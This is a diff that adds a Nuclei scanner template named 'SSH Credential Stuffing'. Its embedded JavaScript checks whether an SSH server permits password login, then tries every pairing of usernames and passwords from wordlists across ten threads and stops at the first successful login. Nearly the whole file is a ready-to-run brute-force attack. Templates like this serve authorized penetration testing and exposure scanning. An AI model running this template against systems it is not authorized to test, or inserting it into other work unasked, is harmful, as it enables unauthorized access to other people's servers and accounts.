@@ -1,0 +1,41 @@
+id: ssh-brute
+info:
+  author: tarunKoyalwar
+  name: SSH Credential Stuffing
+  severity: critical
+javascript:
+- args:
+    Host: '{{Host}}'
+    Password: '{{passwords}}'
+    Port: '22'
+    Username: '{{usernames}}'
+  attack: clusterbomb
+  code: 'var m = require("nuclei/ssh");
+
+    var c = m.SSHClient();
+
+    c.Connect(Host,Port,Username,Password);
+
+    '
+  matchers:
+  - condition: and
+    dsl:
+    - response == true
+    - success == true
+    type: dsl
+  payloads:
+    passwords: helpers/wordlists/wp-passwords.txt
+    usernames: helpers/wordlists/wp-users.txt
+  pre-condition: 'var m = require("nuclei/ssh");
+
+    var c = m.SSHClient();
+
+    var response = c.ConnectSSHInfoMode(Host, Port);
+
+    // only bruteforce if ssh allows password based authentication
+
+    response["UserAuth"].includes("password")
+
+    '
+  stop-at-first-match: true
+  threads: 10
